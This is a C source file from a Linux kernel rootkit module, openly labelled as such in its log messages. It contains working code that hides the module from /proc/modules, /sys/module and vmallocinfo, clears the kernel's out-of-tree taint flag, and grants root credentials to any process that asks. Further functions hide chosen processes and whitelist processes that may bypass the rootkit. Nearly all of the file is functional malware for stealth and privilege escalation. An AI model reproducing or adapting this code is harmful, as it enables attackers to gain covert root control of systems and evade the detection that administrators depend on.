#include "utils.h"

#include "constants.h"
#include "hooking.h"
#include "macro_utils.h"
#include <asm-generic/bitops/instrumented-atomic.h>
#include <asm/current.h>
#include <linux/cred.h>
#include <linux/errno.h>
#include <linux/kobject.h>
#include <linux/list.h>
#include <linux/module.h>
#include <linux/panic.h>
#include <linux/pid.h>
#include <linux/printk.h>
#include <linux/rbtree.h>
#include <linux/rcupdate.h>
#include <linux/sched.h>
#include <linux/slab.h>
#include <linux/sysfs.h>
#include <linux/types.h>
#include <linux/vmalloc.h>

LIST_HEAD(hidden_pids_list);
LIST_HEAD(authorized_pids_list);

static bool b_hidden = false; // Is the rootkit hidden?

static task_t *(*_find_get_task_by_vpid)(pid_t nr) = NULL; // Pointer to `find_get_task_by_vpid()`

static struct list_head *p_vma_list = NULL; // Pointer to `vmap_area_list`
static struct rb_root *p_vma_root   = NULL; // Pointer to `vmap_area_root`

static unsigned long *p_tainted_mask = NULL;

#define COPY_CHUNK_SIZE (16 * PAGE_SIZE)

// Taken from kernel/module.c:3103
int copy_chunked_from_user(void *p_dst, const void __user *p_usrc, unsigned long ui64_len)
{
    do {
        unsigned long n = min(ui64_len, COPY_CHUNK_SIZE);

        if (copy_from_user(p_dst, p_usrc, n) != 0)
            return -EFAULT;
        cond_resched();
        p_dst += n;
        p_usrc += n;
        ui64_len -= n;
    } while (ui64_len);
    return 0;
}

void hide_module(void)
{
    unsigned int i = 0;
    struct vmap_area *p_vma;
    struct vmap_area *p_vma_tmp;
    struct module_use *p_use;
    struct module_use *p_use_tmp;
    struct module_notes_attrs *notes_attrs = NULL;
    struct module_sect_attrs *sect_attrs   = NULL;

    pr_info("[ROOTKIT] Hiding module...\n");

    IF_U (b_hidden) {
        pr_warn("[ROOTKIT] * Rootkit is already hidden\n");
        return;
    }

    IF_L (p_tainted_mask == NULL) {
        p_tainted_mask = (unsigned long *)lookup_name("tainted_mask");

        IF_U (p_tainted_mask == NULL) {
            pr_err("[ROOTKIT] * Failed to get `tainted_mask` address\n");
        }
        else {
            pr_info("[ROOTKIT] * Original tainted_mask: *%p = %lu\n", p_tainted_mask,
                    *p_tainted_mask);

            clear_bit(TAINT_OOT_MODULE, p_tainted_mask);

            pr_info("[ROOTKIT]   * Cleared TAINT_OOT_MODULE status\n");
            pr_info("[ROOTKIT]   * Edited tainted_mask: *%p = %lu\n", p_tainted_mask,
                    *p_tainted_mask);
        }
    }

    IF_L (p_vma_list == NULL) {
        p_vma_list = (struct list_head *)lookup_name("vmap_area_list");
    }
    pr_info("[ROOTKIT] * p_vma_list: %p\n", p_vma_list);

    IF_L (p_vma_root == NULL) {
        p_vma_root = (struct rb_root *)lookup_name("vmap_area_root");
    }
    pr_info("[ROOTKIT] * p_vma_root: %p\n", p_vma_root);

    IF_U (p_vma_list == NULL || p_vma_root == NULL) {
        pr_err("[ROOTKIT] * Failed to get `vmap_area_list` or `vmap_area_root` address\n");
    }
    else {
        // Remove module from /proc/vmallocinfo
        list_for_each_entry_safe (p_vma, p_vma_tmp, p_vma_list, list) {
            if ((unsigned long)THIS_MODULE > p_vma->va_start &&
                (unsigned long)THIS_MODULE < p_vma->va_end) {
                pr_info("[ROOTKIT] * Removing VMAP area %p...", p_vma);
                list_del(&p_vma->list);
                rb_erase(&p_vma->rb_node, p_vma_root);
                pr_cont(" done\n");
            }
        }
    }

    // Clear dependency list (see kernel/module.c)
    list_for_each_entry_safe (p_use, p_use_tmp, &THIS_MODULE->target_list, target_list) {
        pr_info("[ROOTKIT] * Removing dependency source %p, target %p...", p_use->source->name,
                p_use->target->name);
        list_del(&p_use->source_list);
        list_del(&p_use->target_list);
        sysfs_remove_link(p_use->target->holders_dir, THIS_MODULE->name);
        kfree(p_use);
        pr_cont(" done\n");
    }

    // Clear notes_attr (see kernel/module.c)
    notes_attrs = THIS_MODULE->notes_attrs;
    IF_L (notes_attrs != NULL) {
        pr_info("[ROOTKIT] * Removing notes_attr %p...", notes_attrs);
        if (notes_attrs->dir != NULL) {
            i = THIS_MODULE->notes_attrs->notes;
            while (i-- > 0) {
                pr_info("[ROOTKIT]   * Removing attr %u (%p)...", i, &notes_attrs->attrs[i]);
                sysfs_remove_bin_file(notes_attrs->dir, &notes_attrs->attrs[i]);
            }
            kobject_put(notes_attrs->dir);
        }
        kfree(notes_attrs);
        THIS_MODULE->notes_attrs = NULL;
    }

    // Clear sect_attrs (see kernel/module.c)
    sect_attrs = THIS_MODULE->sect_attrs;
    IF_L (sect_attrs != NULL) {
        pr_info("[ROOTKIT] * Removing sect_attr %p...", sect_attrs);
        sysfs_remove_group(&THIS_MODULE->mkobj.kobj, &sect_attrs->grp);
        for (i = 0; i < sect_attrs->nsections; i++) {
            pr_info("[ROOTKIT]   * Freeing attr %u (%p)...", i, &sect_attrs->attrs[i]);
            kfree(sect_attrs->attrs[i].battr.attr.name);
        }
        kfree(sect_attrs);
        THIS_MODULE->sect_attrs = NULL;
    }

    // Clear various fields
    THIS_MODULE->modinfo_attrs->attr.name = NULL;
    kfree(THIS_MODULE->mkobj.mp);
    THIS_MODULE->mkobj.mp = NULL;
    kfree(THIS_MODULE->mkobj.drivers_dir);
    THIS_MODULE->mkobj.drivers_dir = NULL;

    // Remove module from /proc/modules
    list_del(&THIS_MODULE->list);

    // Remove module from /sys/module/
    kobject_del(&THIS_MODULE->mkobj.kobj);
    list_del(&THIS_MODULE->mkobj.kobj.entry);

    b_hidden = true;

    pr_info("[ROOTKIT] Module was hidden\n");
}

long give_root(const pid_t i32_pid, const int i32_sig)
{
    struct cred *p_creds = NULL; // Pointer to the current task credentials

    // Get the current task credentials
    p_creds = prepare_creds();

    IF_U (p_creds == NULL) {
        pr_err("[ROOTKIT] * Failed to get credentials\n");
        return -EPERM;
    }

    __SET_UIDS(p_creds, ROOT_UID);
    __SET_GIDS(p_creds, ROOT_GID);

    commit_creds(p_creds);

    pr_info("[ROOTKIT] * Process is now root\n");

    return 0;
}

static bool is_pid_in_list(pid_t *const p_pid, task_t **const pp_task,
                           const struct list_head *const p_pid_list)
{
    bool b_ret                    = false; // Return value
    const pid_list_t *p_pid_entry = NULL;  // PID list entry
    task_t *p_task                = NULL;  // Task structure, either from args or from PID
    pid_t i32_pid                 = -1;    // PID to check, either from args or from task

    if (p_pid != NULL) {
        i32_pid = *p_pid;
    }
    if (pp_task != NULL) {
        p_task = *pp_task;
    }

    IF_U (i32_pid == -1 && p_task == NULL) {
        pr_warn("[ROOTKIT]   * is_pid_in_list: No PID or task given\n");
        return false;
    }

    if (i32_pid == -1) {
        i32_pid = p_task->pid;

        if (p_pid != NULL) {
            *p_pid = i32_pid;
        }
    }
    else if (p_task == NULL) {
        if (i32_pid == 0 || i32_pid == current->pid) {
            p_task = get_task_struct(current);
        }
        else {
            IF_U (_find_get_task_by_vpid == NULL) {
                _find_get_task_by_vpid = (task_t * (*)(pid_t)) lookup_name("find_get_task_by_vpid");

                pr_info("[ROOTKIT]   * `find_get_task_by_vpid()` address: %p\n",
                        _find_get_task_by_vpid);

                IF_U (_find_get_task_by_vpid == NULL) {
                    pr_err("[ROOTKIT]   * Failed to get `find_get_task_by_vpid()` address\n");
                    return false;
                }
            }

            p_task = _find_get_task_by_vpid(i32_pid);
        }

        IF_U (p_task == NULL) {
            pr_err("[ROOTKIT]   * Failed to get task struct\n");
            return false;
        }

        if (pp_task != NULL) {
            *pp_task = p_task;
        }
    }

    BUG_ON(p_task->pid != i32_pid);
    //pr_info("[ROOTKIT]   * Checking PID %d, task PID %d\n", i32_pid, p_task->pid);

    pr_info("[ROOTKIT]   * Task comm: %s", p_task->comm);
    IF_U (is_filename_hidden(p_task->comm)) {
        pr_cont(" -> has hidden prefix\n");
        b_ret = true;
        goto put_return;
    }
    else {
        pr_cont(" -> no hidden prefix\n");
    }

    // Check if the given PID is in the list
    list_for_each_entry (p_pid_entry, p_pid_list, list) {
        pr_info("[ROOTKIT]   * Checking PID %d against given PID %d...", p_pid_entry->i32_pid,
                i32_pid);

        IF_U (p_pid_entry->i32_pid == i32_pid) {
            pr_cont(" yes!\n");
            b_ret = true;
            goto put_return;
        }
        else {
            pr_cont(" no\n");
        }
    }

put_return:
    if (pp_task == NULL) {
        // Put the task struct as it won't be used anymore
        put_task_struct(p_task);
    }
    return b_ret;
}

bool is_pid_hidden(const pid_t i32_pid)
{
    // TODO: Also check children PIDs
    pid_t i32_real_pid = get_effective_pid(i32_pid); // Effective PID to check

    if (i32_real_pid == -1) {
        return false;
    }

    pr_info("[ROOTKIT] * Checking if PID %d is hidden...\n", i32_real_pid);

    // TODO: Check if one of the parent PIDs is hidden
    //       Factorize common code with `is_process_authorized()`

    return is_pid_in_list(&i32_real_pid, NULL, &hidden_pids_list);
}

long show_hide_process(const pid_t i32_pid, const int i32_sig)
{
    pid_list_t *p_hidden_pid = NULL;                       // Hidden PID list entry
    pid_list_t *p_tmp        = NULL;                       // Temporary pointer for iteration
    const pid_t i32_real_pid = get_effective_pid(i32_pid); // Effective PID to show

    IF_U (i32_real_pid == -1) {
        return -EPERM;
    }

    switch (i32_sig) {
    case SIGHIDE:
        pr_info("[ROOTKIT] * Hiding process %d\n", i32_real_pid);

        p_hidden_pid = kzalloc(sizeof(pid_list_t), GFP_KERNEL);
        IF_U (p_hidden_pid == NULL) {
            pr_err("[ROOTKIT]   * Failed to allocate memory for PID list entry\n");
            return -EPERM;
        }

        // Add the given PID to the list (if it is 0, add the current PID)
        p_hidden_pid->i32_pid = i32_real_pid;

        list_add(&p_hidden_pid->list, &hidden_pids_list);
        break;

    case SIGSHOW:
        pr_info("[ROOTKIT] * Unhiding process %d\n", i32_real_pid);

        // Remove the given PID from the hidden list (if it is 0, remove the current PID)
        list_for_each_entry_safe (p_hidden_pid, p_tmp, &hidden_pids_list, list) {
            if (p_hidden_pid->i32_pid == i32_real_pid) {
                list_del(&p_hidden_pid->list);
                kfree(p_hidden_pid);
            }
        }
        break;

    default:
        pr_err("[ROOTKIT] * show_hide_process(): Invalid signal: %d\n", i32_sig);
        return -EINVAL;
    }

    return 0;
}

void show_all_processes(void)
{
    pid_list_t *p_hidden_pid = NULL; // Hidden PID list entry
    pid_list_t *p_tmp        = NULL; // Temporary pointer for iteration

    pr_info("[ROOTKIT] Unhiding all processes...\n");

    // Remove all PIDs from the hidden list
    list_for_each_entry_safe (p_hidden_pid, p_tmp, &hidden_pids_list, list) {
        pr_info("[ROOTKIT] * Unhiding PID %d\n", p_hidden_pid->i32_pid);
        list_del(&p_hidden_pid->list);
        kfree(p_hidden_pid);
    }
}

bool is_process_authorized(const pid_t i32_pid)
{
    bool b_ret            = false;                      // Return value
    pid_t i32_real_pid    = get_effective_pid(i32_pid); // Effective PID to check
    task_t *p_task        = NULL;                       // Task with the given PID
    task_t *p_task_parent = NULL;                       // Parent task
    task_t *p_task_tmp    = NULL;                       // Temp pointer to keep a reference

    if (i32_real_pid == -1) {
        return false;
    }

    pr_info("[ROOTKIT] * Checking if PID %d is authorized...\n", i32_real_pid);

    // Check if the given PID is authorized, and get its task struct
    b_ret = is_pid_in_list(&i32_real_pid, &p_task, &authorized_pids_list);

    IF_U (b_ret) {
        pr_info("[ROOTKIT]   * PID %d can bypass rootkit!\n", i32_real_pid);
        goto loop_end;
    }

    pr_info("[ROOTKIT]   * AUTH Task comm: %s\n", p_task->comm);

    // Check if one of the given process' parents is in the authorized list
    p_task_parent = p_task;
    while (true) {
        p_task_parent = get_task_struct(p_task_parent);

        rcu_read_lock();
        p_task_tmp = rcu_dereference(p_task_parent->real_parent);
        rcu_read_unlock();
        put_task_struct(p_task_parent);
        p_task_parent = p_task_tmp;

        if (p_task_parent == NULL || p_task_parent->pid == 0) {
            b_ret = false;
            break;
        }

        pr_info("[ROOTKIT]   * Checking parent PID %d...", p_task_parent->pid);

        b_ret = is_pid_in_list(NULL, &p_task_parent, &authorized_pids_list);

        IF_U (b_ret) {
            pr_info("[ROOTKIT]   * PID %d can bypass rootkit (thanks to parent %d)!\n",
                    i32_real_pid, p_task_parent->pid);
            goto loop_end;
        }
    }

loop_end:
    put_task_struct(p_task);
    return b_ret;
}

long authorize_process(const pid_t i32_pid, const int i32_sig)
{
    pid_list_t *p_authorized_pid = NULL;                       // Authorized PID list entry
    const pid_t i32_real_pid     = get_effective_pid(i32_pid); // Effective PID to authorize

    IF_U (i32_real_pid == -1) {
        return -EPERM;
    }

    pr_info("[ROOTKIT] * Authorizing process %d\n", i32_real_pid);

    p_authorized_pid = kzalloc(sizeof(pid_list_t), GFP_KERNEL);
    IF_U (p_authorized_pid == NULL) {
        pr_err("[ROOTKIT]   * Failed to allocate memory for PID list entry\n");
        return -EPERM;
    }

    // Add the given PID to the list (if it is 0, add the current PID)
    p_authorized_pid->i32_pid = i32_real_pid;

    list_add(&p_authorized_pid->list, &authorized_pids_list);

    return 0;
}

void clear_auth_list(void)
{
    pid_list_t *p_authorized_pid = NULL; // Authorized PID list entry
    pid_list_t *p_tmp            = NULL; // Temporary pointer for iteration

    pr_info("[ROOTKIT] Clearing authorized process list...\n");

    // Remove all PIDs from the authorized list
    list_for_each_entry_safe (p_authorized_pid, p_tmp, &authorized_pids_list, list) {
        pr_info("[ROOTKIT] * Removing PID %d from authorized list\n", p_authorized_pid->i32_pid);
        list_del(&p_authorized_pid->list);
        kfree(p_authorized_pid);
    }
}
